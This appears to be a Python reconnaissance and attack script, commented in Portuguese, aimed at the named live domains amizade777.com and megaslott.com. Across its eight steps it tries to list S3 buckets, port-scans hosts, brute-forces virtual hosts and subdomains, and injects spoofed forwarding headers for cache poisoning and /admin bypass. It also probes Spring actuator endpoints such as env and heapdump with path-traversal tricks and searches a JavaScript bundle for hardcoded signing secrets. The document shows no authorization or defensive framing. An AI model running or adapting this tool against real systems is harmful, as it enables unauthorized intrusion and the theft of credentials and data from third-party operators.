"""
Bateria extra de testes passivos antes do Burp:
  1. Listagem direta do bucket S3 via HTTP (varios formatos)
  2. Probe em test.megaslott.com / api.megaslott.com em portas alternativas
  3. VHost discovery (Host header brincando)
  4. Cache poisoning headers (X-Forwarded-For, X-Original-URL, etc.)
  5. Search profundo no message.js por chave HMAC do sign do WebSocket
  6. Conexao WebSocket low-level pra capturar primeiro frame
  7. Probe Spring actuator com path traversal
  8. Cross-reference de subdominios amizade777 vs megaslott via DNS
"""
from __future__ import annotations

import gzip
import json
import re
import socket
import ssl
import sys
import time
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT / "src"))

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"


def fetch(url, *, headers=None, method="GET", body=None, timeout=12.0):
    h = {"User-Agent": UA, "Accept": "*/*", "Accept-Encoding": "gzip"}
    if headers:
        h.update(headers)
    req = Request(url, method=method, data=body, headers=h)
    try:
        with urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            if resp.headers.get("content-encoding") == "gzip":
                raw = gzip.decompress(raw)
            return resp.status, dict(resp.getheaders()), raw
    except HTTPError as exc:
        try:
            raw = exc.read()
        except Exception:
            raw = b""
        return exc.code, dict(exc.headers or {}), raw
    except Exception as exc:
        return None, {}, str(exc).encode()


def banner(t):
    print(f"\n{'=' * 70}\n  {t}\n{'=' * 70}")


# ---------------------------------------------------------------------
# 1. S3 listing direto
# ---------------------------------------------------------------------

def step_s3_listing():
    banner("[1/8] S3 BUCKET LISTING DIRETO (sx.megaslott.com)")
    out = []
    urls = [
        "https://sx.megaslott.com/?list-type=2",
        "https://sx.megaslott.com/?list-type=2&prefix=",
        "https://sx.megaslott.com/?list-type=2&prefix=download/",
        "https://sx.megaslott.com/?list-type=2&max-keys=10",
        "https://sx.megaslott.com/?prefix=download",
        "https://sx.megaslott.com/?delimiter=/",
        "https://sx.megaslott.com/?delimiter=/&prefix=download/",
        "https://sx.megaslott.com/?marker=Amizade",
        "https://sx.megaslott.com/?versions",
        "https://sx.megaslott.com/?policy",
        "https://sx.megaslott.com/?acl",
        "https://sx.megaslott.com/?cors",
        "https://sx.megaslott.com/?lifecycle",
        # Se for fronted por CloudFront, talvez o bucket de origem seja outro:
        "https://megaslott-prod.s3.amazonaws.com/?list-type=2",
        "https://megaslott.s3.amazonaws.com/?list-type=2",
        "https://sx-megaslott.s3.amazonaws.com/?list-type=2",
        "https://amizade777.s3.amazonaws.com/?list-type=2",
        "https://amizade-prod.s3.amazonaws.com/?list-type=2",
    ]
    for url in urls:
        status, headers, body = fetch(url, timeout=10)
        text = body[:300].decode("utf-8", errors="replace")
        if status:
            ctype = headers.get("Content-Type") or headers.get("content-type") or ""
            interesting = (
                status == 200
                or ("ListBucketResult" in text)
                or ("<Contents>" in text)
                or ("Amizade" in text and "<Key>" in text)
            )
            mark = "  <-- LIST OK!" if interesting else ""
            print(f"  [{status}] {url}{mark}")
            if interesting:
                print(f"      ctype: {ctype}")
                print(f"      body: {text[:400]}")
            elif status == 403 and "AccessDenied" not in text:
                # 403 com mensagem diferente pode indicar policy parcial
                print(f"      body: {text[:200]}")
            out.append({"url": url, "status": status, "size": len(body),
                       "interesting": interesting, "body": text[:400]})
        else:
            print(f"  [---] {url}")
            out.append({"url": url, "error": True})
        time.sleep(0.2)
    return out


# ---------------------------------------------------------------------
# 2. Portas alternativas em test/api megaslott
# ---------------------------------------------------------------------

def tcp_probe(host, port, timeout=4.0):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def step_megaslott_ports():
    banner("[2/8] PORTAS ABERTAS EM api/test/sx megaslott.com")
    out = {}
    hosts = ["api.megaslott.com", "test.megaslott.com", "sx.megaslott.com"]
    ports = [80, 443, 8000, 8080, 8443, 8888, 3000, 3001, 5000, 5601, 9000, 9090, 9200, 9300]
    for host in hosts:
        try:
            ip = socket.gethostbyname(host)
        except OSError:
            print(f"  {host}: nao resolve")
            out[host] = {"resolves": False}
            continue
        print(f"\n  {host} ({ip}):")
        open_ports = []
        for p in ports:
            if tcp_probe(ip, p, timeout=3):
                print(f"    {p:>5}/tcp ABERTA")
                open_ports.append(p)
        out[host] = {"ip": ip, "open_ports": open_ports}
        # Tentar HTTP nas portas abertas
        for p in open_ports:
            for scheme in ("http", "https"):
                if (scheme == "https" and p in (80, 8000, 5000, 5601, 9090, 9200)):
                    continue
                if (scheme == "http" and p in (443, 8443)):
                    continue
                url = f"{scheme}://{host}:{p}/"
                status, headers, body = fetch(url, timeout=8)
                if status:
                    server = headers.get("Server") or headers.get("server") or ""
                    text = body[:80].decode("utf-8", errors="replace").replace("\n", " ")
                    print(f"      {url}: {status} server={server[:30]} body={text[:80]}")
    return out


# ---------------------------------------------------------------------
# 3. VHost discovery
# ---------------------------------------------------------------------

VHOST_NAMES = [
    "admin.amizade777.com", "manage.amizade777.com", "manager.amizade777.com",
    "console.amizade777.com", "panel.amizade777.com", "painel.amizade777.com",
    "adm.amizade777.com", "internal.amizade777.com", "intranet.amizade777.com",
    "staging.amizade777.com", "stage.amizade777.com", "homolog.amizade777.com",
    "dev.amizade777.com", "test.amizade777.com", "qa.amizade777.com",
    "uat.amizade777.com", "preview.amizade777.com",
    "api.amizade777.com", "api-internal.amizade777.com",
    "operator.amizade777.com", "operador.amizade777.com",
    "agent.amizade777.com", "agente.amizade777.com",
    "agentes.amizade777.com", "afiliado.amizade777.com",
    "backoffice.amizade777.com", "back.amizade777.com",
    "support.amizade777.com", "suporte.amizade777.com",
    "system.amizade777.com", "sys.amizade777.com",
    "monitor.amizade777.com", "metrics.amizade777.com",
    "grafana.amizade777.com", "kibana.amizade777.com",
    "prometheus.amizade777.com",
    "actuator.amizade777.com",
    # Tentando os subdominios do dominio lateral
    "admin.megaslott.com", "panel.megaslott.com", "manage.megaslott.com",
    "internal.megaslott.com", "operator.megaslott.com",
]


def step_vhost():
    banner("[3/8] VHOST DISCOVERY (Host header tricks)")
    print("  Manda GET https://ds.amizade777.com/ mas com Host: <candidato>")
    print("  Diferenca de tamanho/status indica vhost roteando")
    out = []
    # Baseline
    base_status, base_headers, base_body = fetch(
        "https://ds.amizade777.com/", headers={"Host": "ds.amizade777.com"}, timeout=10,
    )
    base_size = len(base_body)
    print(f"  baseline ds.amizade777.com: status={base_status} size={base_size}")

    for vh in VHOST_NAMES:
        status, headers, body = fetch(
            "https://ds.amizade777.com/",
            headers={"Host": vh},
            timeout=8,
        )
        size = len(body)
        ctype = headers.get("Content-Type") or ""
        diff = (status != base_status) or (abs(size - base_size) > 200)
        marker = "  <-- DIFERENTE" if diff else ""
        # Pega so o titulo do html se diferente
        title = ""
        if diff and body:
            m = re.search(rb"<title[^>]*>([^<]+)</title>", body, re.I)
            if m:
                title = m.group(1).decode(errors="replace")[:60]
        print(f"    Host: {vh:<40s} -> {status} size={size} title={title}{marker}")
        out.append({"vhost": vh, "status": status, "size": size, "diff": diff,
                    "title": title})
        time.sleep(0.2)
    return out


# ---------------------------------------------------------------------
# 4. Cache poisoning headers
# ---------------------------------------------------------------------

CACHE_HEADERS = [
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Forwarded-For", "172.16.0.245"),
    ("X-Forwarded-Host", "evil.example.com"),
    ("X-Forwarded-Host", "internal.amizade777.com"),
    ("X-Forwarded-Proto", "http"),
    ("X-Original-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
    ("X-Real-IP", "172.16.0.245"),
    ("X-Originating-IP", "127.0.0.1"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Forwarded-Server", "internal.amizade777.com"),
    ("X-Host", "evil.example.com"),
    ("Referer", "http://internal.amizade777.com/"),
    ("X-Backend-Server", "172.16.0.245:3001"),
    ("X-Internal", "1"),
    ("X-Debug", "1"),
    ("Cluster-Client-IP", "172.16.0.245"),
    ("Forwarded", "for=127.0.0.1; host=evil.example.com"),
]


def step_cache_poison():
    banner("[4/8] CACHE POISONING / HEADER ABUSE")
    print("  GET / com cada header e ve se o response muda")
    out = []
    base_status, base_headers, base_body = fetch("https://ds.amizade777.com/", timeout=10)
    base_size = len(base_body)
    print(f"  baseline: status={base_status} size={base_size}")
    for name, value in CACHE_HEADERS:
        status, headers, body = fetch(
            "https://ds.amizade777.com/",
            headers={name: value},
            timeout=8,
        )
        size = len(body)
        diff = abs(size - base_size) > 100 or status != base_status
        # Procurar reflexao do valor injetado
        reflected = value.encode() in body if status == 200 else False
        # Procurar header diferente nos response headers
        new_headers = []
        for k, v in headers.items():
            if k.lower() in ("location", "x-cache-key", "vary"):
                if value.lower() in (v or "").lower():
                    new_headers.append(f"{k}={v}")
        marker = ""
        if diff:
            marker = "  <-- size diff"
        if reflected:
            marker += " REFLECTED"
        if new_headers:
            marker += f" header={new_headers}"
        print(f"    {name+':':<32s} {value!r:<40s} -> {status} size={size}{marker}")
        out.append({
            "header": name, "value": value, "status": status, "size": size,
            "diff": diff, "reflected": reflected, "echoed_headers": new_headers,
        })
        time.sleep(0.15)
    return out


# ---------------------------------------------------------------------
# 5. message.js search profundo
# ---------------------------------------------------------------------

def step_message_js_deep():
    banner("[5/8] DEEP DIVE EM message.js (procurar segredo do sign do WebSocket)")
    bundles = ROOT / "bundles"
    target = None
    for f in bundles.iterdir():
        if "message.js" in f.name and "ds" in f.name:
            target = f
            break
    if not target:
        print("  message.js nao encontrado em bundles/")
        return {}
    text = target.read_text(encoding="utf-8", errors="replace")
    print(f"  arquivo: {target.name} ({len(text)} chars)")

    out = {}
    # Procurar funcoes relacionadas a sign / md5 / hmac
    sign_calls = re.findall(r"(\w+\.sign|sign\s*=\s*function|sign:\s*function|MD5\([^)]{1,200}\)|HmacSHA256\([^)]{1,200}\))", text)
    print(f"\n  Chamadas a sign/md5/hmac: {len(sign_calls)}")
    for s in sign_calls[:20]:
        print(f"    {s[:120]}")
    out["sign_calls"] = sign_calls[:30]

    # Constantes hex de 16-32-64 bytes (chave HMAC)
    hex_consts = re.findall(r'["\']([a-f0-9]{16,64})["\']', text)
    md5_keys = [h for h in hex_consts if len(h) == 32]
    sha256_keys = [h for h in hex_consts if len(h) == 64]
    sixteen = [h for h in hex_consts if len(h) == 16]
    print(f"\n  Constantes hex: 16-bytes={len(set(sixteen))} 32-bytes={len(set(md5_keys))} 64-bytes={len(set(sha256_keys))}")
    if sixteen:
        print(f"    16-bytes (primeiros 10):")
        for h in list(set(sixteen))[:10]:
            print(f"      {h}")
    out["hex16"] = sorted(set(sixteen))[:20]
    out["hex32"] = sorted(set(md5_keys))[:20]
    out["hex64"] = sorted(set(sha256_keys))[:20]

    # Procurar protobuf field tags
    proto_fields = re.findall(r"['\"]?(msgtype|sign|cmd|data|time|userId|gameId|roomId|seqId|seq)['\"]?\s*:\s*", text)
    print(f"\n  Protobuf field references: {len(proto_fields)}")
    out["proto_fields"] = list(set(proto_fields))

    # Procurar nomes de mensagens protobuf (geralmente PascalCase)
    msg_names = re.findall(r"\b([A-Z][a-zA-Z0-9_]{4,40}(?:Req|Res|Resp|Notice|Push|Msg|Message|Event|Cmd))\b", text)
    msg_unique = sorted(set(msg_names))
    print(f"\n  Nomes de mensagens protobuf (heuristica): {len(msg_unique)}")
    for n in msg_unique[:30]:
        print(f"    {n}")
    out["proto_msgs"] = msg_unique[:80]

    # Procurar URLs de WebSocket
    ws_urls = list(set(re.findall(r"wss?://[^\s\"'<>]+", text)))
    print(f"\n  URLs de WebSocket no JS: {len(ws_urls)}")
    for u in ws_urls[:10]:
        print(f"    {u}")
    out["ws_urls"] = ws_urls

    # Procurar substrings com "secret", "salt", "key" hardcoded
    secret_patterns = [
        re.compile(r'(?:secret|salt|signKey|sign_key|signSecret|hmacKey|hmacSecret)\s*[:=]\s*["\']([^"\']+)["\']', re.I),
        re.compile(r'(?:WS_SECRET|WS_KEY|MSG_SECRET|MSG_KEY)\s*[:=]\s*["\']([^"\']+)["\']'),
    ]
    secret_hits = []
    for p in secret_patterns:
        for m in p.findall(text):
            secret_hits.append(m)
    print(f"\n  Strings de secret/salt/key encontradas: {len(secret_hits)}")
    for h in secret_hits[:10]:
        print(f"    {h[:100]}")
    out["secret_hits"] = secret_hits[:20]

    return out


# ---------------------------------------------------------------------
# 6. WebSocket low-level
# ---------------------------------------------------------------------

def step_ws_handshake():
    banner("[6/8] WEBSOCKET HANDSHAKE (low-level, sem login)")
    host = "ds.amizade777.com"
    path = "/websocket6"
    try:
        ctx = ssl.create_default_context()
        sock = socket.create_connection((host, 443), timeout=10)
        sock = ctx.wrap_socket(sock, server_hostname=host)
        # Random key (16 bytes base64)
        import base64, secrets
        ws_key = base64.b64encode(secrets.token_bytes(16)).decode()
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {ws_key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"User-Agent: {UA}\r\n"
            f"Origin: https://{host}\r\n"
            f"\r\n"
        )
        sock.send(req.encode())
        sock.settimeout(8.0)
        resp = b""
        try:
            for _ in range(5):
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if b"\r\n\r\n" in resp and len(resp) > 200:
                    break
        except socket.timeout:
            pass
        text = resp.decode("utf-8", errors="replace")
        print(f"  resposta ({len(resp)} bytes):")
        for ln in text.split("\r\n")[:30]:
            print(f"    {ln[:140]}")
        sock.close()
        return {"raw": text[:2000], "size": len(resp)}
    except Exception as exc:
        print(f"  ERRO: {exc}")
        return {"error": str(exc)}


# ---------------------------------------------------------------------
# 7. Spring Boot actuator com path traversal
# ---------------------------------------------------------------------

def step_actuator():
    banner("[7/8] SPRING BOOT ACTUATOR — path traversal e bypass tricks")
    paths = [
        "/japi/actuator/", "/japi/actuator/info", "/japi/actuator/env",
        "/japi/actuator/beans", "/japi/actuator/heapdump",
        "/japi/actuator/configprops", "/japi/actuator/health",
        "/japi/actuator/mappings", "/japi/actuator/threaddump",
        "/japi/actuator/loggers", "/japi/actuator/metrics",
        "/japi/actuator/prometheus",
        # Path traversal tricks
        "/japi/..%2factuator/health",
        "/japi/..;/actuator/health",
        "/japi/.;/actuator/health",
        "/japi/..%2f..%2factuator/health",
        # Direct
        "/actuator/health",
        "/actuator/env",
        "/api/actuator/health",
        "/health",
        "/info",
        # Tomcat specific
        "/manager/html",
        "/host-manager/html",
        # Spring err
        "/error",
        "/japi/error",
        # URL trick: empty path / dot
        "//japi/actuator/health",
        "/japi//actuator/health",
        "/japi/./actuator/health",
    ]
    out = []
    for p in paths:
        url = f"https://ds.amizade777.com{p}"
        status, headers, body = fetch(url, timeout=8)
        text = body[:200].decode("utf-8", errors="replace")
        ctype = (headers.get("Content-Type") or "").split(";")[0]
        interesting = (
            status not in (404, 403, 405)
            and "404 NOT_FOUND" not in text
            and len(body) > 0
            and "ETestNotFound" not in text
        )
        # Spring boot actuator retorna json com {"status":"UP"} em /health
        if "status" in text and "UP" in text:
            interesting = True
        marker = "  <-- INTERESTING" if interesting else ""
        print(f"  [{status:>3}] {len(body):>5}b  {p:<50s}{marker}")
        if interesting:
            print(f"    body: {text[:200]}")
        out.append({"path": p, "status": status, "size": len(body), "interesting": interesting})
        time.sleep(0.15)
    return out


# ---------------------------------------------------------------------
# 8. Cross-reference subdominios amizade777 vs megaslott via DNS
# ---------------------------------------------------------------------

def step_cross_dns():
    banner("[8/8] CROSS-REFERENCE DNS (mais prefixos em ambos os apexes)")
    extra_prefixes = [
        "internal", "intranet", "vpn", "remote",
        "billing", "invoice", "finance", "rh",
        "static-old", "old", "v1", "legacy",
        "operator", "operador",
        "afiliados", "agente",
        "dev", "test", "qa", "staging", "uat", "homolog",
        "stg", "stage", "uat2", "qa2",
        "app1", "app2", "app3",
        "wapp", "mapp",
        "internal-api", "api-old", "api-new", "newapi",
        "manager", "managers", "supervisor",
    ]
    out = {}
    for apex in ("amizade777.com", "megaslott.com"):
        print(f"\n  testando {apex}:")
        for p in extra_prefixes:
            host = f"{p}.{apex}"
            try:
                ips = sorted({i[4][0] for i in socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)})
                if ips:
                    print(f"    [DNS] {host} -> {', '.join(ips)}")
                    out[host] = ips
            except OSError:
                continue
    return out


def main():
    out = {
        "s3_listing": step_s3_listing(),
        "megaslott_ports": step_megaslott_ports(),
        "vhost": step_vhost(),
        "cache_poison": step_cache_poison(),
        "message_js": step_message_js_deep(),
        "ws_handshake": step_ws_handshake(),
        "actuator": step_actuator(),
        "cross_dns": step_cross_dns(),
    }
    Path("sessao_extra.json").write_text(
        json.dumps(out, indent=2, ensure_ascii=False, default=str),
        encoding="utf-8",
    )
    print("\n  Salvo em sessao_extra.json")


if __name__ == "__main__":
    main()
